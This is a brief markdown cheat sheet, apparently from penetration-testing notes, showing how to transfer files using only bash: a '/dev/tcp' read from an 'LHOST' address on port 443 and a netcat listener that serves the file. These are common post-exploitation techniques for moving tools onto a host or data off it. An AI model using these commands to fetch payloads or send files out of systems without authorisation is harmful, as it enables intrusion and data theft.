## transfer / download files with just bash
### receive
```bash
LHOST=1.2.3.4
LPORT=443
bash -c "cat < /dev/tcp/$LHOST/$LPORT" > filename
```
### send
```bash
LPORT=443
nc -lvnp $LPORT < filename
```

